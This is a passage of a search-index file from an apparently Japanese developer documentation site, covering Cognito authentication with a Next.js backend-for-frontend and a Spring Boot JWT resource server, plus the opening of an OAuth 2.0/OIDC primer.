}) {\n      session.user.id = token.sub as string;\n      session.accessToken = token.accessToken;\n      session.idToken = token.idToken;\n      session.error = token.error;\n      return session;\n    }\n  },\n\n  pages: {\n    signIn: '/auth/signin',\n    error: '/auth/error',\n  }\n};\n\nconst handler = NextAuth(authOptions);\nexport { handler as GET, handler as POST };\n</code></pre>"},{"location":"implementation-guide/#2_1","title":"2. \u74b0\u5883\u5909\u6570\u8a2d\u5b9a","text":"<pre><code># .env.local\nCOGNITO_CLIENT_ID=xxxxxxxxxxxxxxxxxxxx\nCOGNITO_CLIENT_SECRET=yyyyyyyyyyyyyyyyyyyy\nCOGNITO_ISSUER=https://cognito-idp.ap-northeast-1.amazonaws.com/ap-northeast-1_xxxxxxxxx\nNEXTAUTH_URL=http://localhost:3000\nNEXTAUTH_SECRET=&lt;generate-random-secret&gt;\n\n# \u30d0\u30c3\u30af\u30a8\u30f3\u30c9API URL\nAPI_BASE_URL=http://localhost:8080\n</code></pre>"},{"location":"implementation-guide/#3-bff-api","title":"3. BFF: API \u30d7\u30ed\u30ad\u30b7","text":"<pre><code>// app/api/users/profile/route.ts\nimport { getServerSession } from \"next-auth\";\nimport { authOptions } from \"@/app/api/auth/[...nextauth]/route\";\nimport { NextRequest, NextResponse } from \"next/server\";\n\nexport async function GET(request: NextRequest) {\n  // \u30bb\u30c3\u30b7\u30e7\u30f3\u30c1\u30a7\u30c3\u30af\n  const session = await getServerSession(authOptions);\n\n  if (!session || !session.idToken) {\n    return NextResponse.json(\n      { error: \"Unauthorized\" },\n      { status: 401 }\n    );\n  }\n\n  // Spring Boot API \u306b\u30d7\u30ed\u30ad\u30b7\n  try {\n    const response = await fetch(\n      `${process.env.API_BASE_URL}/users/profile`,\n      {\n        method: \"GET\",\n        headers: {\n          \"Authorization\": `Bearer ${session.idToken}`,\n          \"Content-Type\": \"application/json\",\n        },\n        // \u30ad\u30e3\u30c3\u30b7\u30e5\u6226\u7565(\u30aa\u30d7\u30b7\u30e7\u30f3)\n        next: { revalidate: 60 }\n      }\n    );\n\n    if (!response.ok) {\n      throw new Error(`API Error: ${response.status}`);\n    }\n\n    const data = await response.json();\n    return NextResponse.json(data);\n\n  } catch (error) {\n    console.error(\"API Proxy Error:\", error);\n    return NextResponse.json(\n      { error: \"API request failed\" },\n      { status: 500 }\n    );\n  }\n}\n</code></pre>"},{"location":"implementation-guide/#4","title":"4. \u30af\u30e9\u30a4\u30a2\u30f3\u30c8\u5074\u306e\u5b9f\u88c5","text":"<pre><code>// app/dashboard/page.tsx\n\"use client\";\n\nimport { useSession } from \"next-auth/react\";\nimport { useEffect, useState } from \"react\";\n\nexport default function Dashboard() {\n  const { data: session, status } = useSession();\n  const [profile, setProfile] = useState&lt;any&gt;(null);\n\n  useEffect(() =&gt; {\n    if (status === \"authenticated\") {\n      // BFF\u7d4c\u7531\u3067API\u306b\u30a2\u30af\u30bb\u30b9\n      // Cookie\u306f\u81ea\u52d5\u9001\u4fe1\u3055\u308c\u308b\u305f\u3081\u3001Authorization\u4e0d\u8981\n      fetch(\"/api/users/profile\")\n        .then(res =&gt; {\n          if (!res.ok) throw new Error(\"API Error\");\n          return res.json();\n        })\n        .then(data =&gt; setProfile(data))\n        .catch(err =&gt; console.error(err));\n    }\n  }, [status]);\n\n  if (status === \"loading\") {\n    return &lt;div&gt;Loading...&lt;/div&gt;;\n  }\n\n  if (status === \"unauthenticated\") {\n    return &lt;div&gt;Please sign in&lt;/div&gt;;\n  }\n\n  return (\n    &lt;div&gt;\n      &lt;h1&gt;Welcome {session?.user?.name}&lt;/h1&gt;\n      {profile &amp;&amp; (\n        &lt;pre&gt;{JSON.stringify(profile, null, 2)}&lt;/pre&gt;\n      )}\n    &lt;/div&gt;\n  );\n}\n</code></pre>"},{"location":"implementation-guide/#5-middleware","title":"5. Middleware \u3067\u30eb\u30fc\u30c8\u4fdd\u8b77","text":"<pre><code>// middleware.ts\nimport { withAuth } from \"next-auth/middleware\";\n\nexport default withAuth({\n  callbacks: {\n    authorized({ token }) {\n      return !!token;\n    },\n  },\n});\n\nexport const config = {\n  matcher: [\n    \"/dashboard/:path*\",\n    \"/api/users/:path*\",\n    \"/api/proxy/:path*\",\n  ],\n};\n</code></pre>"},{"location":"implementation-guide/#spring-boot-api","title":"\u5b9f\u88c5: Spring Boot API","text":""},{"location":"implementation-guide/#1_2","title":"1. \u4f9d\u5b58\u95a2\u4fc2\u8ffd\u52a0","text":"<pre><code>// build.gradle\ndependencies {\n    implementation 'org.springframework.boot:spring-boot-starter-web'\n    implementation 'org.springframework.boot:spring-boot-starter-security'\n    implementation 'org.springframework.boot:spring-boot-starter-oauth2-resource-server'\n}\n</code></pre>"},{"location":"implementation-guide/#2-applicationyml","title":"2. application.yml \u8a2d\u5b9a","text":"<pre><code>spring:\n  security:\n    oauth2:\n      resourceserver:\n        jwt:\n          # Cognito \u306e Issuer URL\n          issuer-uri: https://cognito-idp.ap-northeast-1.amazonaws.com/ap-northeast-1_xxxxxxxxx\n          # JWKs \u30a8\u30f3\u30c9\u30dd\u30a4\u30f3\u30c8(\u516c\u958b\u9375\u53d6\u5f97)\n          jwk-set-uri: https://cognito-idp.ap-northeast-1.amazonaws.com/ap-northeast-1_xxxxxxxxx/.well-known/jwks.json\n</code></pre>"},{"location":"implementation-guide/#3-security","title":"3. Security \u8a2d\u5b9a","text":"<pre><code>package com.example.config;\n\nimport org.springframework.context.annotation.Bean;\nimport org.springframework.context.annotation.Configuration;\nimport org.springframework.security.config.annotation.method.configuration.EnableMethodSecurity;\nimport org.springframework.security.config.annotation.web.builders.HttpSecurity;\nimport org.springframework.security.config.annotation.web.configuration.EnableWebSecurity;\nimport org.springframework.security.config.http.SessionCreationPolicy;\nimport org.springframework.security.oauth2.server.resource.authentication.JwtAuthenticationConverter;\nimport org.springframework.security.oauth2.server.resource.authentication.JwtGrantedAuthoritiesConverter;\nimport org.springframework.security.web.SecurityFilterChain;\nimport org.springframework.web.cors.CorsConfiguration;\nimport org.springframework.web.cors.CorsConfigurationSource;\nimport org.springframework.web.cors.UrlBasedCorsConfigurationSource;\n\nimport java.util.Arrays;\n\n@Configuration\n@EnableWebSecurity\n@EnableMethodSecurity\npublic class SecurityConfig {\n\n    @Bean\n    public SecurityFilterChain filterChain(HttpSecurity http) throws Exception {\n        http\n            // CSRF\u7121\u52b9\u5316(JWT\u4f7f\u7528\u6642)\n            .csrf(csrf -&gt; csrf.disable())\n\n            // CORS\u8a2d\u5b9a\n            .cors(cors -&gt; cors.configurationSource(corsConfigurationSource()))\n\n            // \u30b9\u30c6\u30fc\u30c8\u30ec\u30b9\n            .sessionManagement(session -&gt;\n                session.sessionCreationPolicy(SessionCreationPolicy.STATELESS))\n\n            // \u8a8d\u8a3c\u30eb\u30fc\u30eb\n            .authorizeHttpRequests(auth -&gt; auth\n                .requestMatchers(\"/health\", \"/actuator/**\").permitAll()\n                .anyRequest().authenticated()\n            )\n\n            // JWT\u691c\u8a3c\n            .oauth2ResourceServer(oauth2 -&gt; oauth2\n                .jwt(jwt -&gt; jwt\n                    .jwtAuthenticationConverter(jwtAuthenticationConverter())\n                )\n            );\n\n        return http.build();\n    }\n\n    /**\n     * Cognito\u306e\u30b0\u30eb\u30fc\u30d7\u3092\u30ed\u30fc\u30eb\u306b\u5909\u63db\n     */\n    @Bean\n    public JwtAuthenticationConverter jwtAuthenticationConverter() {\n        JwtAuthenticationConverter converter = new JwtAuthenticationConverter();\n\n        JwtGrantedAuthoritiesConverter authoritiesConverter =\n            new JwtGrantedAuthoritiesConverter();\n\n        // Cognito \u306e\u30b0\u30eb\u30fc\u30d7 claim \u3092\u4f7f\u7528\n        authoritiesConverter.setAuthoritiesClaimName(\"cognito:groups\");\n        authoritiesConverter.setAuthorityPrefix(\"ROLE_\");\n\n        converter.setJwtGrantedAuthoritiesConverter(authoritiesConverter);\n        return converter;\n    }\n\n    /**\n     * CORS\u8a2d\u5b9a(\u91cd\u8981: \u30ef\u30a4\u30eb\u30c9\u30ab\u30fc\u30c9\u7981\u6b62)\n     */\n    @Bean\n    public CorsConfigurationSource corsConfigurationSource() {\n        CorsConfiguration configuration = new CorsConfiguration();\n\n        // \u8a31\u53ef\u3059\u308b\u30aa\u30ea\u30b8\u30f3(Next.js BFF)\n        configuration.setAllowedOrigins(Arrays.asList(\n            \"http://localhost:3000\",    // \u958b\u767a\u74b0\u5883\n            \"https://yourapp.com\"        // \u672c\u756a\u74b0\u5883\n        ));\n\n        configuration.setAllowedMethods(Arrays.asList(\n            \"GET\", \"POST\", \"PUT\", \"DELETE\", \"OPTIONS\"\n        ));\n\n        configuration.setAllowedHeaders(Arrays.asList(\"*\"));\n        configuration.setAllowCredentials(true);\n        configuration.setMaxAge(3600L);\n\n        UrlBasedCorsConfigurationSource source = new UrlBasedCorsConfigurationSource();\n        source.registerCorsConfiguration(\"/**\", configuration);\n        return source;\n    }\n}\n</code></pre>"},{"location":"implementation-guide/#4-controller","title":"4. Controller \u5b9f\u88c5","text":"<pre><code>package com.example.controller;\n\nimport org.springframework.security.access.prepost.PreAuthorize;\nimport org.springframework.security.core.annotation.AuthenticationPrincipal;\nimport org.springframework.security.oauth2.jwt.Jwt;\nimport org.springframework.web.bind.annotation.*;\n\n@RestController\n@RequestMapping(\"/users\")\npublic class UserController {\n\n    /**\n     * \u30e6\u30fc\u30b6\u30fc\u30d7\u30ed\u30d5\u30a3\u30fc\u30eb\u53d6\u5f97\n     */\n    @GetMapping(\"/profile\")\n    public UserProfile getProfile(@AuthenticationPrincipal Jwt jwt) {\n        // JWT \u304b\u3089\u60c5\u5831\u3092\u53d6\u5f97\n        String userId = jwt.getSubject();  // Cognito User ID\n        String email = jwt.getClaim(\"email\");\n        String name = jwt.getClaim(\"name\");\n\n        // \u30d3\u30b8\u30cd\u30b9\u30ed\u30b8\u30c3\u30af\n        UserProfile profile = userService.getProfile(userId);\n\n        return profile;\n    }\n\n    /**\n     * \u7ba1\u7406\u8005\u306e\u307f\u30a2\u30af\u30bb\u30b9\u53ef\u80fd\n     */\n    @PreAuthorize(\"hasRole('Admin')\")\n    @GetMapping(\"/admin\")\n    public List&lt;User&gt; getAllUsers() {\n        return userService.getAllUsers();\n    }\n\n    /**\n     * \u30e6\u30fc\u30b6\u30fc\u60c5\u5831\u66f4\u65b0\n     */\n    @PutMapping(\"/profile\")\n    public UserProfile updateProfile(\n        @AuthenticationPrincipal Jwt jwt,\n        @RequestBody UserProfileUpdateRequest request\n    ) {\n        String userId = jwt.getSubject();\n\n        // \u66f4\u65b0\u51e6\u7406\n        return userService.updateProfile(userId, request);\n    }\n}\n</code></pre>"},{"location":"implementation-guide/#5-jwt","title":"5. JWT \u691c\u8a3c\u306e\u8a73\u7d30","text":"<p>Spring Security\u304c\u81ea\u52d5\u7684\u306b\u4ee5\u4e0b\u3092\u691c\u8a3c:</p> <pre><code>// \u81ea\u52d5\u691c\u8a3c\u3055\u308c\u308b\u9805\u76ee\n- \u2705 \u7f72\u540d\u306e\u6b63\u5f53\u6027(JWKS\u306e\u516c\u958b\u9375\u3067\u691c\u8a3c)\n- \u2705 \u6709\u52b9\u671f\u9650(exp claim)\n- \u2705 \u767a\u884c\u8005(iss claim)\n- \u2705 Not Before(nbf claim)\n- \u2705 Issued At(iat claim)\n\n// \u624b\u52d5\u3067\u8ffd\u52a0\u691c\u8a3c\u3059\u308b\u5834\u5408\n@Bean\npublic JwtDecoder jwtDecoder() {\n    NimbusJwtDecoder jwtDecoder = NimbusJwtDecoder\n        .withJwkSetUri(jwkSetUri)\n        .build();\n\n    // Audience(aud)\u691c\u8a3c\n    OAuth2TokenValidator&lt;Jwt&gt; audienceValidator =\n        new DelegatingOAuth2TokenValidator&lt;&gt;(\n            JwtValidators.createDefaultWithIssuer(issuerUri),\n            new AudienceValidator(\"your-client-id\")\n        );\n\n    jwtDecoder.setJwtValidator(audienceValidator);\n    return jwtDecoder;\n}\n</code></pre>"},{"location":"implementation-guide/#_8","title":"\u88dc\u8db3: \u30c8\u30fc\u30af\u30f3\u30ea\u30d5\u30ec\u30c3\u30b7\u30e5","text":""},{"location":"implementation-guide/#_9","title":"\u30ea\u30d5\u30ec\u30c3\u30b7\u30e5\u30d5\u30ed\u30fc","text":"<pre><code>sequenceDiagram\n    autonumber\n    participant Browser as \ud83c\udf10 \u30d6\u30e9\u30a6\u30b6\n    participant Next as \u26a1 Next.js\n    participant Cognito as \ud83d\udd10 Cognito\n    participant Spring as \u2615 Spring Boot\n\n    Browser-&gt;&gt;Next: API\u30ea\u30af\u30a8\u30b9\u30c8\n    Next-&gt;&gt;Next: ID\u30c8\u30fc\u30af\u30f3\u671f\u9650\u5207\u308c\u691c\u77e5\n    Next-&gt;&gt;Cognito: \u30ea\u30d5\u30ec\u30c3\u30b7\u30e5\u30c8\u30fc\u30af\u30f3\u9001\u4fe1\n    Cognito-&gt;&gt;Next: \u65b0\u3057\u3044ID\u30c8\u30fc\u30af\u30f3&lt;br/&gt;\u65b0\u3057\u3044\u30ea\u30d5\u30ec\u30c3\u30b7\u30e5\u30c8\u30fc\u30af\u30f3\n    Next-&gt;&gt;Next: \u30bb\u30c3\u30b7\u30e7\u30f3\u66f4\u65b0\n    Next-&gt;&gt;Spring: \u65b0\u3057\u3044ID\u30c8\u30fc\u30af\u30f3\u3067\u30ea\u30c8\u30e9\u30a4\n    Spring-&gt;&gt;Next: \u30c7\u30fc\u30bf\u8fd4\u5374\n    Next-&gt;&gt;Browser: \u30ec\u30b9\u30dd\u30f3\u30b9</code></pre>"},{"location":"implementation-guide/#nextauth","title":"NextAuth \u3067\u306e\u30c8\u30fc\u30af\u30f3\u30ea\u30d5\u30ec\u30c3\u30b7\u30e5\u5b9f\u88c5","text":"<pre><code>// app/api/auth/[...nextauth]/route.ts\nasync jwt({ token, account, profile }) {\n  // \u521d\u56de\u30ed\u30b0\u30a4\u30f3\u6642\n  if (account) {\n    token.accessToken = account.access_token;\n    token.idToken = account.id_token;\n    token.refreshToken = account.refresh_token;\n    token.expiresAt = account.expires_at; // Unix timestamp\n    token.sub = profile?.sub;\n    return token;\n  }\n\n  // \u30c8\u30fc\u30af\u30f3\u6709\u52b9\u671f\u9650\u30c1\u30a7\u30c3\u30af\n  const now = Math.floor(Date.now() / 1000);\n  const expiresAt = token.expiresAt as number;\n\n  // \u307e\u3060\u6709\u52b9\n  if (now &lt; expiresAt) {\n    return token;\n  }\n\n  // \u671f\u9650\u5207\u308c \u2192 \u30ea\u30d5\u30ec\u30c3\u30b7\u30e5\n  try {\n    const response = await fetch(\n      `${process.env.COGNITO_ISSUER}/oauth2/token`,\n      {\n        method: \"POST\",\n        headers: {\n          \"Content-Type\": \"application/x-www-form-urlencoded\",\n        },\n        body: new URLSearchParams({\n          grant_type: \"refresh_token\",\n          refresh_token: token.refreshToken as string,\n          client_id: process.env.COGNITO_CLIENT_ID!,\n          client_secret: process.env.COGNITO_CLIENT_SECRET!,\n        }),\n      }\n    );\n\n    if (!response.ok) {\n      throw new Error(\"Token refresh failed\");\n    }\n\n    const refreshed = await response.json();\n\n    return {\n      ...token,\n      accessToken: refreshed.access_token,\n      idToken: refreshed.id_token,\n      refreshToken: refreshed.refresh_token ?? token.refreshToken,\n      expiresAt: Math.floor(Date.now() / 1000) + refreshed.expires_in,\n    };\n  } catch (error) {\n    console.error(\"Error refreshing token:\", error);\n    return {\n      ...token,\n      error: \"RefreshTokenError\",\n    };\n  }\n}\n</code></pre>"},{"location":"implementation-guide/#_10","title":"\u88dc\u8db3: \u30a8\u30e9\u30fc\u30cf\u30f3\u30c9\u30ea\u30f3\u30b0","text":""},{"location":"implementation-guide/#1-401","title":"1. \u8a8d\u8a3c\u30a8\u30e9\u30fc(401)","text":"<pre><code>// Next.js BFF\nexport async function GET(request: NextRequest) {\n  const session = await getServerSession(authOptions);\n\n  if (!session) {\n    return NextResponse.json(\n      {\n        error: \"Unauthorized\",\n        message: \"Please sign in\"\n      },\n      { status: 401 }\n    );\n  }\n\n  // \u30bb\u30c3\u30b7\u30e7\u30f3\u306b\u30a8\u30e9\u30fc\u304c\u3042\u308b\u5834\u5408(\u30ea\u30d5\u30ec\u30c3\u30b7\u30e5\u5931\u6557\u7b49)\n  if (session.error === \"RefreshTokenError\") {\n    return NextResponse.json(\n      {\n        error: \"SessionExpired\",\n        message: \"Please sign in again\"\n      },\n      { status: 401 }\n    );\n  }\n\n  // ...\n}\n</code></pre>"},{"location":"implementation-guide/#2-spring-boot","title":"2. Spring Boot\u5074\u306e\u30a8\u30e9\u30fc\u30cf\u30f3\u30c9\u30ea\u30f3\u30b0","text":"<pre><code>@RestControllerAdvice\npublic class GlobalExceptionHandler {\n\n    /**\n     * JWT\u691c\u8a3c\u5931\u6557\n     */\n    @ExceptionHandler(JwtException.class)\n    public ResponseEntity&lt;ErrorResponse&gt; handleJwtException(JwtException ex) {\n        return ResponseEntity\n            .status(HttpStatus.UNAUTHORIZED)\n            .body(new ErrorResponse(\n                \"INVALID_TOKEN\",\n                \"Invalid or expired token\"\n            ));\n    }\n\n    /**\n     * \u6a29\u9650\u4e0d\u8db3\n     */\n    @ExceptionHandler(AccessDeniedException.class)\n    public ResponseEntity&lt;ErrorResponse&gt; handleAccessDenied(AccessDeniedException ex) {\n        return ResponseEntity\n            .status(HttpStatus.FORBIDDEN)\n            .body(new ErrorResponse(\n                \"INSUFFICIENT_PERMISSIONS\",\n                \"You don't have permission to access this resource\"\n            ));\n    }\n}\n</code></pre>"},{"location":"implementation-guide/#_11","title":"\u307e\u3068\u3081\u3068\u30c1\u30a7\u30c3\u30af\u30ea\u30b9\u30c8","text":""},{"location":"implementation-guide/#_12","title":"\u5b9f\u88c5\u306e\u91cd\u8981\u30dd\u30a4\u30f3\u30c8","text":""},{"location":"implementation-guide/#nextjsbff_1","title":"\u2705 Next.js(BFF)","text":"<ul> <li> NextAuth \u3067 Authorization Code + PKCE \u5b9f\u88c5</li> <li> \u30c8\u30fc\u30af\u30f3\u3092\u30b5\u30fc\u30d0\u30fc\u30bb\u30c3\u30b7\u30e7\u30f3\u3067\u7ba1\u7406</li> <li> BFF \u30d1\u30bf\u30fc\u30f3\u3067 API \u30d7\u30ed\u30ad\u30b7</li> <li> Cookie: HttpOnly/Secure/SameSite</li> <li> \u30c8\u30fc\u30af\u30f3\u30ea\u30d5\u30ec\u30c3\u30b7\u30e5\u5b9f\u88c5</li> </ul>"},{"location":"implementation-guide/#spring-boot","title":"\u2705 Spring Boot","text":"<ul> <li> OAuth2 Resource Server \u3068\u3057\u3066\u8a2d\u5b9a</li> <li> JWT \u81ea\u52d5\u691c\u8a3c(\u7f72\u540d\u3001issuer\u3001exp)</li> <li> CORS \u9069\u5207\u306b\u8a2d\u5b9a(\u30ef\u30a4\u30eb\u30c9\u30ab\u30fc\u30c9\u7981\u6b62)</li> <li> \u30ed\u30fc\u30eb\u30d9\u30fc\u30b9\u30a2\u30af\u30bb\u30b9\u5236\u5fa1(@PreAuthorize)</li> <li> \u30b9\u30c6\u30fc\u30c8\u30ec\u30b9\u8a2d\u8a08</li> </ul>"},{"location":"implementation-guide/#aws-cognito_1","title":"\u2705 AWS Cognito","text":"<ul> <li> OAuth 2.1 \u6e96\u62e0\u8a2d\u5b9a(Code + PKCE)</li> <li> Implicit Flow \u7121\u52b9\u5316</li> <li> \u30ea\u30c0\u30a4\u30ec\u30af\u30c8URI \u5b8c\u5168\u4e00\u81f4</li> <li> \u30c8\u30fc\u30af\u30f3\u6709\u52b9\u671f\u9650\u9069\u5207(\u30a2\u30af\u30bb\u30b91h\u3001\u30ea\u30d5\u30ec\u30c3\u30b7\u30e530d)</li> <li> Advanced Security \u6709\u52b9\u5316</li> </ul>"},{"location":"implementation-guide/#_13","title":"\u30bb\u30ad\u30e5\u30ea\u30c6\u30a3\u30c1\u30a7\u30c3\u30af\u30ea\u30b9\u30c8","text":"<ul> <li> \u30c8\u30fc\u30af\u30f3\u304c LocalStorage \u306b\u4fdd\u5b58\u3055\u308c\u3066\u3044\u306a\u3044</li> <li> PKCE + state + nonce \u4f7f\u7528</li> <li> HTTPS \u901a\u4fe1(\u672c\u756a\u74b0\u5883)</li> <li> CSP(Content Security Policy)\u8a2d\u5b9a</li> <li> API\u30ec\u30fc\u30c8\u5236\u9650</li> <li> \u30ed\u30b0\u30fb\u76e3\u67fb\u8a3c\u8de1</li> <li> \u5b9a\u671f\u7684\u306a\u4f9d\u5b58\u95a2\u4fc2\u66f4\u65b0</li> </ul>"},{"location":"implementation-guide/#_14","title":"\u6b21\u306e\u30b9\u30c6\u30c3\u30d7","text":"<ol> <li>MFA\u5b9f\u88c5: TOTP\u3001WebAuthn/\u30d1\u30b9\u30ad\u30fc</li> <li>\u30ea\u30b9\u30af\u30d9\u30fc\u30b9\u8a8d\u8a3c: \u7570\u5e38\u691c\u77e5\u3001\u30a2\u30c0\u30d7\u30c6\u30a3\u30d6MFA</li> <li>\u9ad8\u5ea6\u306a\u30bb\u30ad\u30e5\u30ea\u30c6\u30a3: PAR\u3001DPoP\u3001mTLS (\u8a73\u7d30\u306f\u5305\u62ec\u7684\u30ea\u30d5\u30a1\u30ec\u30f3\u30b9\u53c2\u7167)</li> <li>\u76e3\u8996\u30fb\u904b\u7528: CloudWatch\u3001X-Ray\u3001\u30a2\u30e9\u30fc\u30c8</li> </ol>"},{"location":"implementation-guide/#_15","title":"\u53c2\u8003\u8cc7\u6599","text":""},{"location":"implementation-guide/#_16","title":"\u516c\u5f0f\u30c9\u30ad\u30e5\u30e1\u30f3\u30c8","text":"<ul> <li>NextAuth.js</li> <li>Spring Security OAuth2</li> <li>AWS Cognito</li> </ul>"},{"location":"implementation-guide/#_17","title":"\u6a19\u6e96\u4ed5\u69d8","text":"<ul> <li>OAuth 2.1</li> <li>OpenID Connect</li> <li>PKCE RFC 7636</li> </ul> <p>\u6700\u7d42\u66f4\u65b0: 2025\u5e7410\u670815\u65e5 \u5bfe\u8c61\u8aad\u8005: \u8a8d\u8a3c\u6a5f\u80fd\u306e\u5b9f\u88c5\u3092\u62c5\u5f53\u3059\u308b\u958b\u767a\u8005</p>"},{"location":"oauth-oidc-basics/","title":"OAuth 2.0 / OpenID Connect \u306e\u57fa\u790e","text":"<p>\ud83d\udd10 \u8a8d\u8a3c\u30fb\u8a8d\u53ef &gt; OAuth 2.0 / OIDC \u672c\u30c9\u30ad\u30e5\u30e1\u30f3\u30c8\u3067\u306f\u3001OAuth 2.0\u3068OpenID Connect\u306e\u57fa\u790e\u77e5\u8b58\u3092\u89e3\u8aac\u3057\u307e\u3059\u3002\u30d7\u30ed\u30c8\u30b3\u30eb\u306e\u76ee\u7684\u3068\u9055\u3044\u3001\u5404\u7a2e\u30d5\u30ed\u30fc\u306e\u9078\u629e\u57fa\u6e96\u3001\u30c8\u30fc\u30af\u30f3\u306e\u7a2e\u985e\u3001\u91cd\u8981\u306a\u30bb\u30ad\u30e5\u30ea\u30c6\u30a3\u6a5f\u80fd\u306b\u3064\u3044\u3066\u8a73\u3057\u304f\u8aac\u660e\u3057\u307e\u3059\u3002</p>"},{"location":"oauth-oidc-basics/#_1","title":"\u524d\u63d0\u77e5\u8b58","text":"<ul> <li>\u6982\u8981 - \u8a8d\u8a3c\u30fb\u8a8d\u53ef\u306e\u57fa\u790e\u3092\u5148\u306b\u8aad\u3080\u3053\u3068\u3092\u63a8\u5968</li> </ul>"},{"location":"oauth-oidc-basics/#_2","title":"\u95a2\u9023\u30c9\u30ad\u30e5\u30e1\u30f3\u30c8","text":"<ul> <li>\u6b21\u306e\u30b9\u30c6\u30c3\u30d7: \u30bb\u30ad\u30e5\u30ea\u30c6\u30a3\u5bfe\u7b56 - \u8105\u5a01\u3068\u5bfe\u7b56</li> <li>\u5b9f\u88c5: \u5b9f\u88c5\u30ac\u30a4\u30c9 - Next.js + Spring Boot + Cognito</li> <li>\u8a73\u7d30: \u5305\u62ec\u7684\u30ea\u30d5\u30a1\u30ec\u30f3\u30b9 - \u6700\u65b0\u30bb\u30ad\u30e5\u30ea\u30c6\u30a3\u6280\u8853</li> </ul>"},{"location":"oauth-oidc-basics/#_3","title":"\u76ee\u6b21","text":"<ol> <li>OAuth 2.0\u3068\u306f</li> <li>OpenID Connect(OIDC)\u3068\u306f</li> <li>\u30d5\u30ed\u30fc\u306e\u7a2e\u985e\u3068\u9078\u629e</li> <li>\u30c8\u30fc\u30af\u30f3\u306e\u7a2e\u985e</li> <li>\u91cd\u8981\u306a\u30bb\u30ad\u30e5\u30ea\u30c6\u30a3\u6a5f\u80fd</li> </ol>"},{"location":"oauth-oidc-basics/#oauth-20","title":"OAuth 2.0\u3068\u306f","text":""},{"location":"oauth-oidc-basics/#_4","title":"\u6982\u8981","text":"<p>**OAuth 2.0\u306f\u300c\u8a8d\u53ef\u300d\u306e\u305f\u3081\u306e\u6a19\u6e96\u30d7\u30ed\u30c8\u30b3\u30eb**\u3067\u3059(\u8a8d\u8a3c\u3067\u306f\u3042\u308a\u307e\u305b\u3093)\u3002</p> <ul> <li>\u7b56\u5b9a: 2012\u5e74(RFC 6749)</li> <li>\u6700\u65b0: OAuth 2.1(\u30c9\u30e9\u30d5\u30c8\u30012025\u5e74\u6a19\u6e96\u5316\u4e88\u5b9a)</li> <li>\u76ee\u7684: \u30b5\u30fc\u30c9\u30d1\u30fc\u30c6\u30a3\u30a2\u30d7\u30ea\u306b\u9650\u5b9a\u7684\u306a\u30a2\u30af\u30bb\u30b9\u6a29\u3092\u4e0e\u3048\u308b</li> </ul>"},{"location":"oauth-oidc-basics/#_5","title":"\u89e3\u6c7a\u3059\u308b\u554f\u984c","text":"<p>\u60aa\u3044\u4f8b: \u30d1\u30b9\u30ef\u30fc\u30c9\u3092\u5171\u6709</p> <pre><code>\u30e6\u30fc\u30b6\u30fc \u2192 \u5199\u771f\u5171\u6709\u30a2\u30d7\u30ea\u306bGoogle\u306e\u30d1\u30b9\u30ef\u30fc\u30c9\u3092\u6e21\u3059\n         \u2192 \u30a2\u30d7\u30ea\u304cGoogle\u306e\u5168\u30c7\u30fc\u30bf\u306b\u30a2\u30af\u30bb\u30b9\u53ef\u80fd\n</code></pre> <p>\u826f\u3044\u4f8b: OAuth 2.0</p> <pre><code>\u30e6\u30fc\u30b6\u30fc \u2192 Google\u3067\u8a8d\u8a3c\n         \u2192 \u300c\u5199\u771f\u306e\u95b2\u89a7\u306e\u307f\u300d\u306e\u6a29\u9650(\u30c8\u30fc\u30af\u30f3)\u3092\u767a\u884c\n         \u2192 \u30a2\u30d7\u30ea\u306f\u9650\u5b9a\u7684\u306a\u30a2\u30af\u30bb\u30b9\u306e\u307f\u53ef\u80fd\n</code></pre>"},{"location":"oauth-oidc-basics/#_6","title":"\u57fa\u672c\u7684\u306a\u6d41\u308c","text":"<pre><code>sequenceDiagram\n    participant User as \u30e6\u30fc\u30b6\u30fc\n    participant Client as \u30af\u30e9\u30a4\u30a2\u30f3\u30c8\u30a2\u30d7\u30ea\n    participant AuthServer as \u8a8d\u53ef\u30b5\u30fc\u30d0\u30fc\n    participant API as \u30ea\u30bd\u30fc\u30b9\u30b5\u30fc\u30d0\u30fc(API)\n\n    User-&gt;&gt;Client: 1. \u30ed\u30b0\u30a4\u30f3\u30dc\u30bf\u30f3\u3092\u30af\u30ea\u30c3\u30af\n    Client-&gt;&gt;AuthServer: 2. \u8a8d\u53ef\u30ea\u30af\u30a8\u30b9\u30c8(redirect)\n    AuthServer-&gt;&gt;User: 3. \u30ed\u30b0\u30a4\u30f3\u753b\u9762\u8868\u793a\n    User-&gt;&gt;AuthServer: 4. \u8a8d\u8a3c\u60c5\u5831\u5165\u529b\n    AuthServer-&gt;&gt;User: 5. \u6a29\u9650\u8a31\u53ef\u753b\u9762\u8868\u793a\n    User-&gt;&gt;AuthServer: 6. \u8a31\u53ef\n    AuthServer-&gt;&gt;Client: 7. \u8a8d\u53ef\u30b3\u30fc\u30c9\u767a\u884c(redirect)\n    Client-&gt;&gt;AuthServer: 8. \u8a8d\u53ef\u30b3\u30fc\u30c9 + \u30af\u30e9\u30a4\u30a2\u30f3\u30c8\u8a8d\u8a3c\u60c5\u5831\n    AuthServer-&gt;&gt;Client: 9. \u30a2\u30af\u30bb\u30b9\u30c8\u30fc\u30af\u30f3\u767a\u884c\n    Client-&gt;&gt;API: 10. \u30a2\u30af\u30bb\u30b9\u30c8\u30fc\u30af\u30f3\u4ed8\u304d\u30ea\u30af\u30a8\u30b9\u30c8\n    API-&gt;&gt;Client: 11. \u30c7\u30fc\u30bf\u8fd4\u5374</code></pre>"},{"location":"oauth-oidc-basics/#openid-connectoidc","title":"OpenID Connect(OIDC)\u3068\u306f","text":""},{"location":"oauth-oidc-basics/#_7","title":"\u6982\u8981","text":"<p>**OpenID Connect\u306f\u300c\u8a8d\u8a3c\u300d\u306e\u305f\u3081\u306e\u30d7\u30ed\u30c8\u30b3\u30eb**\u3067\u3001OAuth 2.0\u306e\u4e0a\u306b\u69cb\u7bc9\u3055\u308c\u3066\u3044\u307e\u3059\u3002</p> <ul> <li>\u7b56\u5b9a: 2014\u5e74</li> <li>\u76ee\u7684: OAuth 2.0\u306b\u8a8d\u8a3c\u6a5f\u80fd\u3092\u8ffd\u52a0</li> <li>\u63d0\u4f9b: \u30e6\u30fc\u30b6\u30fc\u60c5\u5831(ID\u3001\u540d\u524d\u3001\u30e1\u30fc\u30eb\u30a2\u30c9\u30ec\u30b9\u7b49)</li> </ul>"},{"location":"oauth-oidc-basics/#oauth-20_1","title":"OAuth 2.0\u3068\u306e\u9055\u3044","text":"\u9805\u76ee OAuth 2.0 OpenID Connect \u76ee\u7684 \u8a8d\u53ef(\u6a29\u9650\u4ed8\u4e0e) 